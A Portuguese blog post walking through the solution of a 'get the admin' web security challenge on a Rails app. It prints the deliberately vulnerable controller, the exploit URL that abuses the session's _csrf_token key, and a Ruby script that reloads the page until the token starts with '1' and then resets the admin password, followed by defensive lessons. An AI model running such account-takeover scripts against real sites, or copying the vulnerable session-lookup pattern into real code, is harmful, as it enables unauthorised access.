---
title: "[Small Bite] Session Injection Challenge"
date: "2014-08-28T15:00:00.000Z"
tags: ["security"]
years: "2014"
---

<p></p>
<p>Eu expliquei rapidamente sobre Metasploit no <a href="http://www.akitaonrails.com/2014/08/27/small-bite-brincando-com-metasploit">artigo anterior</a>, e sobre o desafio do <a href="https://gist.github.com/joernchen">@joernchen</a>. Se você ainda não resolveu o desafio, talvez queira deixar pra ler este artigo depois!</p>
<p><strong>SPOILER ALERT</strong></p>
<p>Mas se abriu até aqui no artigo é porque quer saber o que é o problema. O @joernchen <a href="https://gist.github.com/joernchen/9dfa57017b4732c04bcc">publicou exatamente o seguinte código</a>:</p>
<p></p>
<p>
</p>
<table class="CodeRay">
  <tbody>
    <tr>
      <td class="line-numbers" title="double click to toggle" ondblclick="with (this.firstChild.style) { display = (display == '') ? 'none' : '' }"><pre><a href="#n1" name="n1">1</a>
<a href="#n2" name="n2">2</a>
<a href="#n3" name="n3">3</a>
<a href="#n4" name="n4">4</a>
<a href="#n5" name="n5">5</a>
<a href="#n6" name="n6">6</a>
<a href="#n7" name="n7">7</a>
<a href="#n8" name="n8">8</a>
<a href="#n9" name="n9">9</a>
<strong><a href="#n10" name="n10">10</a></strong>
<a href="#n11" name="n11">11</a>
<a href="#n12" name="n12">12</a>
<a href="#n13" name="n13">13</a>
<a href="#n14" name="n14">14</a>
<a href="#n15" name="n15">15</a>
<a href="#n16" name="n16">16</a>
<a href="#n17" name="n17">17</a>
<a href="#n18" name="n18">18</a>
<a href="#n19" name="n19">19</a>
<strong><a href="#n20" name="n20">20</a></strong>
<a href="#n21" name="n21">21</a>
<a href="#n22" name="n22">22</a>
<a href="#n23" name="n23">23</a>
<a href="#n24" name="n24">24</a>
<a href="#n25" name="n25">25</a>
<a href="#n26" name="n26">26</a>
<a href="#n27" name="n27">27</a>
<a href="#n28" name="n28">28</a>
<a href="#n29" name="n29">29</a>
<strong><a href="#n30" name="n30">30</a></strong>
<a href="#n31" name="n31">31</a>
<a href="#n32" name="n32">32</a>
<a href="#n33" name="n33">33</a>
<a href="#n34" name="n34">34</a>
<a href="#n35" name="n35">35</a>
<a href="#n36" name="n36">36</a>
<a href="#n37" name="n37">37</a>
<a href="#n38" name="n38">38</a>
<a href="#n39" name="n39">39</a>
<strong><a href="#n40" name="n40">40</a></strong>
<a href="#n41" name="n41">41</a>
<a href="#n42" name="n42">42</a>
<a href="#n43" name="n43">43</a>
<a href="#n44" name="n44">44</a>
<a href="#n45" name="n45">45</a>
<a href="#n46" name="n46">46</a>
<a href="#n47" name="n47">47</a>
<a href="#n48" name="n48">48</a>
<a href="#n49" name="n49">49</a>
</pre>
      </td>
      <td class="code"><pre><span style="color:#777"># Try to become "admin" on https://gettheadmin.herokuapp.com/ </span>
<span style="color:#777"># Vector borrowed from real-world code ;)</span>
<span style="color:#777"># config/routes.rb:</span>
  root <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">'</span><span style="color:#D20">login#login</span><span style="color:#710">'</span></span>
  post <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">'</span><span style="color:#D20">login</span><span style="color:#710">'</span></span> =&gt; <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">'</span><span style="color:#D20">login#login</span><span style="color:#710">'</span></span>
  get <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">'</span><span style="color:#D20">reset/:token</span><span style="color:#710">'</span></span> =&gt; <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">'</span><span style="color:#D20">login#password_reset</span><span style="color:#710">'</span></span>
<span style="color:#777"># app/controllers/login_controller.rb</span>
<span style="color:#080;font-weight:bold">class</span> <span style="color:#B06;font-weight:bold">LoginController</span> &lt; <span style="color:#036;font-weight:bold">ApplicationController</span>
  <span style="color:#080;font-weight:bold">def</span> <span style="color:#06B;font-weight:bold">login</span>
    <span style="color:#080;font-weight:bold">if</span> request.post?
      user = <span style="color:#036;font-weight:bold">User</span>.where(login: params[<span style="color:#A60">:login</span>]).first
      <span style="color:#080;font-weight:bold">if</span> !user.nil?
        <span style="color:#080;font-weight:bold">if</span> params[<span style="color:#A60">:password</span>] == user.password
           render <span style="color:#A60">:text</span> =&gt; <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">"</span><span style="color:#D20">censored</span><span style="color:#710">"</span></span>
        <span style="color:#080;font-weight:bold">end</span>
        render <span style="color:#A60">:text</span> =&gt; <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">"</span><span style="color:#D20">Wrong Password</span><span style="color:#710">"</span></span>
        <span style="color:#080;font-weight:bold">return</span>
      <span style="color:#080;font-weight:bold">end</span>
    <span style="color:#080;font-weight:bold">else</span>
      render <span style="color:#A60">:template</span> =&gt; <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">"</span><span style="color:#D20">login/form</span><span style="color:#710">"</span></span>
    <span style="color:#080;font-weight:bold">end</span>
  <span style="color:#080;font-weight:bold">end</span>
  <span style="color:#080;font-weight:bold">def</span> <span style="color:#06B;font-weight:bold">password_reset</span>
    <span style="color:#33B">@user</span> = <span style="color:#036;font-weight:bold">User</span>.where(token: params[<span style="color:#A60">:token</span>]).first
    <span style="color:#080;font-weight:bold">if</span> <span style="color:#33B">@user</span>
      session[params[<span style="color:#A60">:token</span>]] = <span style="color:#33B">@user</span>.id
    <span style="color:#080;font-weight:bold">else</span>
      user_id = session[params[<span style="color:#A60">:token</span>]]
      <span style="color:#33B">@user</span> = <span style="color:#036;font-weight:bold">User</span>.find(user_id) <span style="color:#080;font-weight:bold">if</span> user_id
    <span style="color:#080;font-weight:bold">end</span>
    <span style="color:#080;font-weight:bold">if</span> !<span style="color:#33B">@user</span>
      render <span style="color:#A60">:text</span> =&gt; <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">"</span><span style="color:#D20">no way!</span><span style="color:#710">"</span></span>
      <span style="color:#080;font-weight:bold">return</span>
    <span style="color:#080;font-weight:bold">elsif</span> params[<span style="color:#A60">:password</span>] &amp;&amp; <span style="color:#33B">@user</span> &amp;&amp; params[<span style="color:#A60">:password</span>].length &gt; <span style="color:#00D">6</span>
      <span style="color:#33B">@user</span>.password = params[<span style="color:#A60">:password</span>]
        <span style="color:#080;font-weight:bold">if</span> <span style="color:#33B">@user</span>.save
          render <span style="color:#A60">:text</span> =&gt; <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">"</span><span style="color:#D20">password changed ;)</span><span style="color:#710">"</span></span>
          <span style="color:#080;font-weight:bold">return</span>
        <span style="color:#080;font-weight:bold">end</span>
    <span style="color:#080;font-weight:bold">end</span>
    render <span style="color:#A60">:text</span> =&gt; <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">"</span><span style="color:#D20">error saving password!</span><span style="color:#710">"</span></span>
  <span style="color:#080;font-weight:bold">end</span>
<span style="color:#080;font-weight:bold">end</span>
</pre>
      </td>
    </tr>
  </tbody>
</table>
<p>Basicamente um trecho do arquivo de <tt>routes.rb</tt> e o <tt>login_controller.rb</tt>. Assuma que também tem um form que poderia ser algo assim:</p>
<table class="CodeRay">
  <tbody>
    <tr>
      <td class="line-numbers" title="double click to toggle" ondblclick="with (this.firstChild.style) { display = (display == '') ? 'none' : '' }"><pre><a href="#n1" name="n1">1</a>
<a href="#n2" name="n2">2</a>
<a href="#n3" name="n3">3</a>
<a href="#n4" name="n4">4</a>
<a href="#n5" name="n5">5</a>
</pre>
      </td>
      <td class="code"><pre><span style="color:#F00;background-color:#FAA">&lt;</span>%= form_tag '/login', method: :post do %<span style="color:#F00;background-color:#FAA">&gt;</span>
  <span style="color:#F00;background-color:#FAA">&lt;</span>%= text_field_tag 'login' %<span style="color:#F00;background-color:#FAA">&gt;</span>
  <span style="color:#F00;background-color:#FAA">&lt;</span>%= password_field_tag 'password' %<span style="color:#F00;background-color:#FAA">&gt;</span>
  <span style="color:#F00;background-color:#FAA">&lt;</span>%= submit_tag 'login' %<span style="color:#F00;background-color:#FAA">&gt;</span>
<span style="color:#F00;background-color:#FAA">&lt;</span>% end %<span style="color:#F00;background-color:#FAA">&gt;</span>
</pre>
      </td>
    </tr>
  </tbody>
</table>
<p>E um model chamado <tt>User</tt> que poderia ter a seguinte migration:</p>
<table class="CodeRay">
  <tbody>
    <tr>
      <td class="line-numbers" title="double click to toggle" ondblclick="with (this.firstChild.style) { display = (display == '') ? 'none' : '' }"><pre><a href="#n1" name="n1">1</a>
<a href="#n2" name="n2">2</a>
<a href="#n3" name="n3">3</a>
<a href="#n4" name="n4">4</a>
<a href="#n5" name="n5">5</a>
<a href="#n6" name="n6">6</a>
<a href="#n7" name="n7">7</a>
<a href="#n8" name="n8">8</a>
<a href="#n9" name="n9">9</a>
<strong><a href="#n10" name="n10">10</a></strong>
<a href="#n11" name="n11">11</a>
</pre>
      </td>
      <td class="code"><pre><span style="color:#080;font-weight:bold">class</span> <span style="color:#B06;font-weight:bold">CreateUsers</span> &lt; <span style="color:#036;font-weight:bold">ActiveRecord</span>::<span style="color:#036;font-weight:bold">Migration</span>
  <span style="color:#080;font-weight:bold">def</span> <span style="color:#06B;font-weight:bold">change</span>
    create_table <span style="color:#A60">:users</span> <span style="color:#080;font-weight:bold">do</span> |t|
      t.string <span style="color:#A60">:token</span>
      t.string <span style="color:#A60">:login</span>
      t.string <span style="color:#A60">:password</span>
      t.timestamps
    <span style="color:#080;font-weight:bold">end</span>
  <span style="color:#080;font-weight:bold">end</span>
<span style="color:#080;font-weight:bold">end</span>
</pre>
      </td>
    </tr>
  </tbody>
</table>
<p>E, finalmente, um seed que poderia ter o seguinte:</p>
<table class="CodeRay">
  <tbody>
    <tr>
      <td class="line-numbers" title="double click to toggle" ondblclick="with (this.firstChild.style) { display = (display == '') ? 'none' : '' }"><pre><a href="#n1" name="n1">1</a>
</pre>
      </td>
      <td class="code"><pre>User.create token: 'qualquercoisa', login: 'admin', password: 'qualquercoisa'
</pre>
      </td>
    </tr>
  </tbody>
</table>
<p>Primeiro entenda o que o controller faz:</p>
<ul>
  <li>tem uma action simples de <tt>login</tt> que valida o POST de usuário e senha e renderiza o form de login.</li>
  <li>tem uma action de <tt>reset_password</tt> que atende a rota <tt>reset/:token</tt>.</li>
</ul>
<p>Quando o form é renderizado, ele gera um HTML assim:</p>
<table class="CodeRay">
  <tbody>
    <tr>
      <td class="line-numbers" title="double click to toggle" ondblclick="with (this.firstChild.style) { display = (display == '') ? 'none' : '' }"><pre><a href="#n1" name="n1">1</a>
<a href="#n2" name="n2">2</a>
<a href="#n3" name="n3">3</a>
<a href="#n4" name="n4">4</a>
<a href="#n5" name="n5">5</a>
<a href="#n6" name="n6">6</a>
<a href="#n7" name="n7">7</a>
<a href="#n8" name="n8">8</a>
<a href="#n9" name="n9">9</a>
<strong><a href="#n10" name="n10">10</a></strong>
<a href="#n11" name="n11">11</a>
<a href="#n12" name="n12">12</a>
<a href="#n13" name="n13">13</a>
<a href="#n14" name="n14">14</a>
<a href="#n15" name="n15">15</a>
<a href="#n16" name="n16">16</a>
<a href="#n17" name="n17">17</a>
<a href="#n18" name="n18">18</a>
<a href="#n19" name="n19">19</a>
</pre>
      </td>
      <td class="code"><pre><span style="color:#34b">&lt;!DOCTYPE html&gt;</span>
<span style="color:#070">&lt;html&gt;</span>
<span style="color:#070">&lt;head&gt;</span>
  <span style="color:#070">&lt;title&gt;</span>Gettheadmin<span style="color:#070">&lt;/title&gt;</span>
  <span style="color:#070">&lt;link</span> <span style="color:#b48">data-turbolinks-track</span>=<span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">"</span><span style="color:#D20">true</span><span style="color:#710">"</span></span> <span style="color:#b48">href</span>=<span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">"</span><span style="color:#D20">/assets/application-9cc0575249625b8d8648563841072913.css</span><span style="color:#710">"</span></span> <span style="color:#b48">media</span>=<span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">"</span><span style="color:#D20">all</span><span style="color:#710">"</span></span> <span style="color:#b48">rel</span>=<span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">"</span><span style="color:#D20">stylesheet</span><span style="color:#710">"</span></span> <span style="color:#070">/&gt;</span>
  <span style="color:#070">&lt;script</span> <span style="color:#b48">data-turbolinks-track</span>=<span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">"</span><span style="color:#D20">true</span><span style="color:#710">"</span></span> <span style="color:#b48">src</span>=<span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">"</span><span style="color:#D20">/assets/application-baf6c4c3436bbd5accc1b87ff9b9eabe.js</span><span style="color:#710">"</span></span><span style="color:#070">&gt;</span><span style="color:#070">&lt;/script&gt;</span>
  <span style="color:#070">&lt;meta</span> <span style="color:#b48">content</span>=<span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">"</span><span style="color:#D20">authenticity_token</span><span style="color:#710">"</span></span> <span style="color:#b48">name</span>=<span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">"</span><span style="color:#D20">csrf-param</span><span style="color:#710">"</span></span> <span style="color:#070">/&gt;</span>
<span style="color:#070">&lt;meta</span> <span style="color:#b48">content</span>=<span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">"</span><span style="color:#D20">857GlwfWLYjv66EGyXa4d7PNUkPZleMgWcL+biMpDzE=</span><span style="color:#710">"</span></span> <span style="color:#b48">name</span>=<span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">"</span><span style="color:#D20">csrf-token</span><span style="color:#710">"</span></span> <span style="color:#070">/&gt;</span>
<span style="color:#070">&lt;/head&gt;</span>
<span style="color:#070">&lt;body&gt;</span>
<span style="color:#070">&lt;form</span> <span style="color:#b48">accept-charset</span>=<span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">"</span><span style="color:#D20">UTF-8</span><span style="color:#710">"</span></span> <span style="color:#b48">action</span>=<span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">"</span><span style="color:#D20">/login</span><span style="color:#710">"</span></span> <span style="color:#b48">method</span>=<span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">"</span><span style="color:#D20">post</span><span style="color:#710">"</span></span><span style="color:#070">&gt;</span><span style="color:#070">&lt;div</span> <span style="color:#b48">style</span>=<span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">"</span><span style="color:#D20">display:none</span><span style="color:#710">"</span></span><span style="color:#070">&gt;</span><span style="color:#070">&lt;input</span> <span style="color:#b48">name</span>=<span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">"</span><span style="color:#D20">utf8</span><span style="color:#710">"</span></span> <span style="color:#b48">type</span>=<span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">"</span><span style="color:#D20">hidden</span><span style="color:#710">"</span></span> <span style="color:#b48">value</span>=<span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">"</span><span style="color:#800;font-weight:bold">&amp;#x2713;</span><span style="color:#710">"</span></span> <span style="color:#070">/&gt;</span><span style="color:#070">&lt;input</span> <span style="color:#b48">name</span>=<span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">"</span><span style="color:#D20">authenticity_token</span><span style="color:#710">"</span></span> <span style="color:#b48">type</span>=<span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">"</span><span style="color:#D20">hidden</span><span style="color:#710">"</span></span> <span style="color:#b48">value</span>=<span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">"</span><span style="color:#D20">857GlwfWLYjv66EGyXa4d7PNUkPZleMgWcL+biMpDzE=</span><span style="color:#710">"</span></span> <span style="color:#070">/&gt;</span><span style="color:#070">&lt;/div&gt;</span>
  <span style="color:#070">&lt;input</span> <span style="color:#b48">id</span>=<span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">"</span><span style="color:#D20">login</span><span style="color:#710">"</span></span> <span style="color:#b48">name</span>=<span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">"</span><span style="color:#D20">login</span><span style="color:#710">"</span></span> <span style="color:#b48">type</span>=<span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">"</span><span style="color:#D20">text</span><span style="color:#710">"</span></span> <span style="color:#070">/&gt;</span>
  <span style="color:#070">&lt;input</span> <span style="color:#b48">id</span>=<span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">"</span><span style="color:#D20">password</span><span style="color:#710">"</span></span> <span style="color:#b48">name</span>=<span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">"</span><span style="color:#D20">password</span><span style="color:#710">"</span></span> <span style="color:#b48">type</span>=<span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">"</span><span style="color:#D20">password</span><span style="color:#710">"</span></span> <span style="color:#070">/&gt;</span>
  <span style="color:#070">&lt;input</span> <span style="color:#b48">name</span>=<span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">"</span><span style="color:#D20">commit</span><span style="color:#710">"</span></span> <span style="color:#b48">type</span>=<span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">"</span><span style="color:#D20">submit</span><span style="color:#710">"</span></span> <span style="color:#b48">value</span>=<span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">"</span><span style="color:#D20">login</span><span style="color:#710">"</span></span> <span style="color:#070">/&gt;</span>
<span style="color:#070">&lt;/form&gt;</span>
<span style="color:#070">&lt;/body&gt;</span>
<span style="color:#070">&lt;/html&gt;</span>
</pre>
      </td>
    </tr>
  </tbody>
</table>
<p>O importante: o token CSRF na tag de meta. Ele é diferente toda vez que você puxa o formulário e serve para evitar <a href="https://guides.rubyonrails.org/security.html#cross-site-request-forgery-csrf">Cross Site Request Forgery</a>. Mas tem um detalhe importante: quando a session é inicializada ele sempre vai ter pelo menos duas chave-valor: uma que é a "session_id" e outra com a chave "_csrf_token" com o valor que aparece no HTML justamente para fazer a checagem.</p>
<p>E a parte que é o buraco no controller é este:</p>
<table class="CodeRay">
  <tbody>
    <tr>
      <td class="line-numbers" title="double click to toggle" ondblclick="with (this.firstChild.style) { display = (display == '') ? 'none' : '' }"><pre><a href="#n1" name="n1">1</a>
<a href="#n2" name="n2">2</a>
</pre>
      </td>
      <td class="code"><pre>user_id = session[params[<span style="color:#A60">:token</span>]]
<span style="color:#33B">@user</span> = <span style="color:#036;font-weight:bold">User</span>.find(user_id) <span style="color:#080;font-weight:bold">if</span> user_id
</pre>
      </td>
    </tr>
  </tbody>
</table>
<p>Se o <tt>params[:token]</tt> for "_csrf_token", o equivalente ficaria assim:</p>
<table class="CodeRay">
  <tbody>
    <tr>
      <td class="line-numbers" title="double click to toggle" ondblclick="with (this.firstChild.style) { display = (display == '') ? 'none' : '' }"><pre><a href="#n1" name="n1">1</a>
</pre>
      </td>
      <td class="code"><pre><span style="color:#33B">@user</span> = <span style="color:#036;font-weight:bold">User</span>.find(session[<span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">'</span><span style="color:#D20">_csrf_token</span><span style="color:#710">'</span></span>])
</pre>
      </td>
    </tr>
  </tbody>
</table>
<p>Agora, sabemos que o <tt>User.create</tt> inicial vai criar um admin com o ID que será o inteiro "1". O método <tt>#find</tt> aceita não só números como strings (para o caso, por exemplo, onde você cria uma renderização alternativa de ID para fazer URLs bonitas como no Wordpress onde ficaria "/1-admin" em vez de "/1").</p>
<p>Quando você faz:</p>
<table class="CodeRay">
  <tbody>
    <tr>
      <td class="line-numbers" title="double click to toggle" ondblclick="with (this.firstChild.style) { display = (display == '') ? 'none' : '' }"><pre><a href="#n1" name="n1">1</a>
</pre>
      </td>
      <td class="code"><pre><span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">"</span><span style="color:#D20">1abcd</span><span style="color:#710">"</span></span>.to_i <span style="color:#777"># =&gt; 1</span>
</pre>
      </td>
    </tr>
  </tbody>
</table>
<p>Note que ele ignora o que não é string e devolve o inteiro 1.</p>
<p>Portanto, basta dar reload no site até o "_csrf_token" começar com "1" seguindo de letras. Aí ele vai fazer <tt>User.find("1abcd")</tt> que é o mesmo que <tt>User.find(1)</tt> e pronto! Conseguimos o usuário. E para piorar, o código do controller ainda faz isso em seguinte:</p>
<table class="CodeRay">
  <tbody>
    <tr>
      <td class="line-numbers" title="double click to toggle" ondblclick="with (this.firstChild.style) { display = (display == '') ? 'none' : '' }"><pre><a href="#n1" name="n1">1</a>
<a href="#n2" name="n2">2</a>
<a href="#n3" name="n3">3</a>
<a href="#n4" name="n4">4</a>
<a href="#n5" name="n5">5</a>
<a href="#n6" name="n6">6</a>
<a href="#n7" name="n7">7</a>
</pre>
      </td>
      <td class="code"><pre><span style="color:#080;font-weight:bold">if</span> params[<span style="color:#A60">:password</span>] &amp;&amp; <span style="color:#33B">@user</span> &amp;&amp; params[<span style="color:#A60">:password</span>].length &gt; <span style="color:#00D">6</span>
  <span style="color:#33B">@user</span>.password = params[<span style="color:#A60">:password</span>]
    <span style="color:#080;font-weight:bold">if</span> <span style="color:#33B">@user</span>.save
      render <span style="color:#A60">:text</span> =&gt; <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">"</span><span style="color:#D20">password changed ;)</span><span style="color:#710">"</span></span>
      <span style="color:#080;font-weight:bold">return</span>
    <span style="color:#080;font-weight:bold">end</span>
<span style="color:#080;font-weight:bold">end</span>
</pre>
      </td>
    </tr>
  </tbody>
</table>
<p>Ou seja, ele grava a nova senha que você passar como parâmetro. Portanto a URL para exploit é:</p>
<table class="CodeRay">
  <tbody>
    <tr>
      <td class="line-numbers" title="double click to toggle" ondblclick="with (this.firstChild.style) { display = (display == '') ? 'none' : '' }"><pre><a href="#n1" name="n1">1</a>
</pre>
      </td>
      <td class="code"><pre>https://gettheadmin.herokuapp.com/reset/_csrf_token?password=1234567
</pre>
      </td>
    </tr>
  </tbody>
</table>
<p>E para automatizar o exploit, fiz este pequeno script:</p>
<table class="CodeRay">
  <tbody>
    <tr>
      <td class="line-numbers" title="double click to toggle" ondblclick="with (this.firstChild.style) { display = (display == '') ? 'none' : '' }"><pre><a href="#n1" name="n1">1</a>
<a href="#n2" name="n2">2</a>
<a href="#n3" name="n3">3</a>
<a href="#n4" name="n4">4</a>
<a href="#n5" name="n5">5</a>
<a href="#n6" name="n6">6</a>
<a href="#n7" name="n7">7</a>
<a href="#n8" name="n8">8</a>
<a href="#n9" name="n9">9</a>
<strong><a href="#n10" name="n10">10</a></strong>
<a href="#n11" name="n11">11</a>
<a href="#n12" name="n12">12</a>
<a href="#n13" name="n13">13</a>
<a href="#n14" name="n14">14</a>
<a href="#n15" name="n15">15</a>
<a href="#n16" name="n16">16</a>
</pre>
      </td>
      <td class="code"><pre>require <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">'</span><span style="color:#D20">rubygems</span><span style="color:#710">'</span></span>
require <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">'</span><span style="color:#D20">mechanize</span><span style="color:#710">'</span></span>
<span style="color:#00D">100</span>.times <span style="color:#080;font-weight:bold">do</span>
  agent = <span style="color:#036;font-weight:bold">Mechanize</span>.new { |agent|
    agent.user_agent_alias = <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">'</span><span style="color:#D20">Mac Safari</span><span style="color:#710">'</span></span>
  }
  page = agent.get(<span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">"</span><span style="color:#D20">https://gettheadmin.herokuapp.com/</span><span style="color:#710">"</span></span>)
  token = page.at(<span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">'</span><span style="color:#D20">meta[@name="csrf-token"]</span><span style="color:#710">'</span></span>)[<span style="color:#A60">:content</span>]
  puts token
  <span style="color:#080;font-weight:bold">if</span> token =~ <span style="background-color:hsla(300,100%,50%,0.06)"><span style="color:#404">/</span><span style="color:#808">^1</span><span style="color:#D20">\w</span><span style="color:#808">+</span><span style="color:#404">/</span></span>
    puts <span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">"</span><span style="color:#D20">TRYING EXPLOIT!!</span><span style="color:#710">"</span></span>
    doc = agent.get(<span style="background-color:hsla(0,100%,50%,0.05)"><span style="color:#710">'</span><span style="color:#D20">https://gettheadmin.herokuapp.com/reset/_csrf_token?password=1234567</span><span style="color:#710">'</span></span>)
    <span style="color:#080;font-weight:bold">break</span> <span style="color:#080;font-weight:bold">if</span> doc.content =~ <span style="background-color:hsla(300,100%,50%,0.06)"><span style="color:#404">/</span><span style="color:#808">password changed</span><span style="color:#404">/</span></span>
  <span style="color:#080;font-weight:bold">end</span>
<span style="color:#080;font-weight:bold">end</span>
</pre>
      </td>
    </tr>
  </tbody>
</table>
<p>Quando o script parar, a senha mudou pra "1234567", agora basta fazer login com o usuário "admin" e senha "1234567" e pronto, você está dentro!</p>
<p>E eu coloquei 100 vezes, mas muito antes disso já vai parar porque não demora muito pra um "_csrf_token" que começa com "1".</p>
<p><img src="https://d7v6meks67904.cloudfront.net/assets/image_asset/image/469/pasted_image_at_2014_08_27_11_38_am.png" srcset="https://d7v6meks67904.cloudfront.net/assets/image_asset/image/469/pasted_image_at_2014_08_27_11_38_am.png 2x" alt="Exploit funciona"></p>
<p>Lições aprendidas:</p>
<ul>
  <li>
    <p>A session tem valores por padrão! Nunca busque chaves na session baseado diretamente num parâmetro de URL. Aliás, <strong>nunca</strong> confie em parâmetros de URL</p>
  </li>
  <li>
    <p>Cuidado com o método <tt>#find</tt> do ActiveRecord por causa da conversão implícita de string para integer.</p>
  </li>
  <li>
    <p>Use uma biblioteca que já cuida desses detalhes como o <a href="https://github.com/plataformatec/devise">Devise</a></p>
  </li>
</ul>
<p>Assista aos screencasts do RubyTapas que falam justamente sobre conversões de strings:</p>
<ul>
  <li><a href="https://www.rubytapas.com/episodes/206-Coercion">206. Coersion</a></li>
  <li><a href="https://www.rubytapas.com/episodes/207-Conversion-Function">207. Conversion Function</a></li>
  <li><a href="https://www.rubytapas.com/episodes/208-Lenient-Conversions">208. Lenient Conversions</a></li>
  <li><a href="https://www.rubytapas.com/episodes/209-Explicit-Conversion">209. Explicit Conversion</a></li>
  <li><a href="https://www.rubytapas.com/episodes/210-Implicit-Conversion">210. Implicit Conversion</a></li>
</ul>
<p>Alguém conseguiu explorar e mudar a senha de admin de outra forma diferente desta? Não deixe de comentar abaixo.</p>
<p></p>